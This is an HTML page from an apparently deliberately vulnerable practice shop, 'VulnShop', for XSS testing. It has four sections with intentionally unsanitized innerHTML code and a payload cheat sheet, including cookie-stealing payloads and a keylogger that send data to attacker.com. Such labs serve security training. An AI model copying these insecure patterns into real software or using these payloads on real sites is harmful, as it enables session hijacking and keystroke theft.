<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>XSS Testing â€” VulnShop</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="stylesheet" href="assets/css/style.css" />
</head>
<body>
  <header class="topbar">
    <div class="brand">VulnShop</div>
    <nav>
      <a href="index.html">Home</a>
      <a href="search.html">Search</a>
      <a href="login.html">Login</a>
      <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">ðŸŒ™</button>
    </nav>
  </header>

  <main class="container">
    <h1>XSS Vulnerability Testing</h1>
    <p class="muted">This page contains multiple advanced XSS vulnerabilities for penetration testing.</p>

    <div class="card mt">
      <h2>1. Reflected XSS</h2>
      <p>Search parameter is reflected without proper encoding:</p>
      <form method="GET" action="xss.html">
        <input type="text" name="search" placeholder="Try: &lt;script&gt;alert('XSS')&lt;/script&gt;" style="width: 100%; max-width: 500px;">
        <button type="submit" class="btn mt">Search</button>
      </form>
      <div id="reflected-output" class="mt card" style="padding: 16px; min-height: 60px;"></div>
      <script>
        const params = new URLSearchParams(location.search);
        const search = params.get('search');
        if (search) {
          // VULNERABLE: Direct innerHTML without sanitization
          document.getElementById('reflected-output').innerHTML = '<p><strong>Search Results for:</strong> ' + search + '</p><p class="muted">Found 0 results</p>';
        } else {
          document.getElementById('reflected-output').innerHTML = '<p class="muted">Enter a search term above</p>';
        }
      </script>
    </div>

    <div class="card mt">
      <h2>2. Stored XSS</h2>
      <p>Comments are stored and displayed without sanitization:</p>
      <form id="comment-form">
        <textarea name="comment" placeholder="Try: &lt;img src=x onerror=alert('XSS')&gt;" rows="3" style="width: 100%;"></textarea>
        <button type="submit" class="btn mt">Post Comment</button>
      </form>
      <div id="comments" class="mt"></div>
      <script>
        // Load stored comments from localStorage
        function loadComments() {
          const comments = JSON.parse(localStorage.getItem('xss_comments') || '[]');
          const container = document.getElementById('comments');
          if (comments.length === 0) {
            container.innerHTML = '<p class="muted">No comments yet. Be the first to comment!</p>';
            return;
          }
          container.innerHTML = '<h3>Comments (' + comments.length + '):</h3>';
          comments.forEach((comment, index) => {
            // VULNERABLE: Stored XSS - no sanitization
            container.innerHTML += `<div class="card mt" style="padding: 16px;">
              <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                <strong>User #${index + 1}</strong>
                <small class="muted">${new Date().toLocaleString()}</small>
              </div>
              <div>${comment}</div>
            </div>`;
          });
        }
        loadComments();
        document.getElementById('comment-form').addEventListener('submit', (e) => {
          e.preventDefault();
          const comment = e.target.comment.value;
          if (!comment.trim()) return;
          const comments = JSON.parse(localStorage.getItem('xss_comments') || '[]');
          comments.push(comment);
          localStorage.setItem('xss_comments', JSON.stringify(comments));
          loadComments();
          e.target.reset();
        });
      </script>
    </div>

    <div class="card mt">
      <h2>3. DOM-based XSS</h2>
      <p>Hash fragment and URL parameters are used to set content:</p>
      <div id="dom-output" class="card" style="padding: 16px; min-height: 60px;"></div>
      <script>
        // VULNERABLE: DOM-based XSS using hash and URL params
        const hash = location.hash.substring(1);
        const params = new URLSearchParams(location.search);
        const name = params.get('name') || hash;
        
        if (name) {
          document.getElementById('dom-output').innerHTML = '<p><strong>Welcome,</strong> ' + decodeURIComponent(name) + '!</p><p class="muted">Your profile has been loaded.</p>';
        } else {
          document.getElementById('dom-output').innerHTML = '<p class="muted">Try adding <code>?name=&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>#&lt;img src=x onerror=alert(1)&gt;</code> to the URL</p>';
        }
      </script>
    </div>

    <div class="card mt">
      <h2>4. Cookie-based XSS</h2>
      <p>Cookie value is displayed without encoding:</p>
      <div id="cookie-output" class="card" style="padding: 16px; min-height: 60px;"></div>
      <form id="cookie-form" class="mt">
        <input type="text" name="username" placeholder="Set username cookie" style="width: 100%; max-width: 400px;">
        <button type="submit" class="btn mt">Set Cookie</button>
      </form>
      <script>
        // VULNERABLE: Cookie value reflected
        function getCookie(name) {
          const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
          if (parts.length === 2) return parts.pop().split(';').shift();
        }
        
        function updateCookieDisplay() {
          const username = getCookie('username');
          const container = document.getElementById('cookie-output');
          if (username) {
            // VULNERABLE: Cookie value reflected without encoding
            container.innerHTML = '<p><strong>Hello,</strong> ' + username + '!</p><p class="muted">Current cookies: ' + document.cookie + '</p>';
          } else {
            container.innerHTML = '<p class="muted">Set a username cookie using the form above, or use: <code>document.cookie="username=&lt;script&gt;alert(1)&lt;/script&gt;"</code></p>';
          }
        }
        
        updateCookieDisplay();
        
        document.getElementById('cookie-form').addEventListener('submit', (e) => {
          e.preventDefault();
          const username = e.target.username.value;
          if (username) {
            document.cookie = `username=${username}; path=/; max-age=3600`;
            updateCookieDisplay();
            e.target.reset();
          }
        });
      </script>
    </div>

    <div class="card mt">
      <h2>5. Advanced XSS Payloads</h2>
      <div class="mt">
        <h3>Basic Payloads:</h3>
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 12px;">
          <div>
            <strong>Script Tag:</strong>
            <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
          </div>
          <div>
            <strong>Image Tag:</strong>
            <pre><code>&lt;img src=x onerror=alert('XSS')&gt;</code></pre>
          </div>
          <div>
            <strong>SVG Tag:</strong>
            <pre><code>&lt;svg onload=alert('XSS')&gt;</code></pre>
          </div>
          <div>
            <strong>Body Tag:</strong>
            <pre><code>&lt;body onload=alert('XSS')&gt;</code></pre>
          </div>
        </div>
        
        <h3 class="mt">Advanced Payloads (Cookie Stealing):</h3>
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 12px;">
          <div>
            <strong>Fetch API:</strong>
            <pre><code>&lt;script&gt;
fetch('/api/steal?cookie='+document.cookie)
&lt;/script&gt;</code></pre>
          </div>
          <div>
            <strong>Image Tag:</strong>
            <pre><code>&lt;img src=x onerror="fetch('http://attacker.com/steal?data='+document.cookie)"&gt;</code></pre>
          </div>
          <div>
            <strong>New Image:</strong>
            <pre><code>&lt;script&gt;
new Image().src='http://attacker.com/steal?cookie='+document.cookie
&lt;/script&gt;</code></pre>
          </div>
        </div>
        
        <h3 class="mt">Keylogger Payloads:</h3>
        <pre><code>&lt;script&gt;
document.addEventListener('keypress',function(e){
  fetch('http://attacker.com/keylog?key='+e.key)
})
&lt;/script&gt;</code></pre>
        
        <h3 class="mt">Filter Bypass Techniques:</h3>
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 12px;">
          <div>
            <strong>Case Variation:</strong>
            <pre><code>&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</code></pre>
          </div>
          <div>
            <strong>HTML Entities:</strong>
            <pre><code>&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&gt;</code></pre>
          </div>
          <div>
            <strong>String.fromCharCode:</strong>
            <pre><code>&lt;img src=x onerror='alert(String.fromCharCode(88,83,83))'&gt;</code></pre>
          </div>
          <div>
            <strong>SVG Bypass:</strong>
            <pre><code>&lt;svg/onload=alert(1)&gt;</code></pre>
          </div>
        </div>
      </div>
    </div>
  </main>

  <script src="assets/js/theme.js"></script>
  <script src="assets/js/vulnerabilities.js"></script>
  <script src="assets/js/logger.js"></script>
  <script src="assets/js/app.js"></script>
</body>
</html>
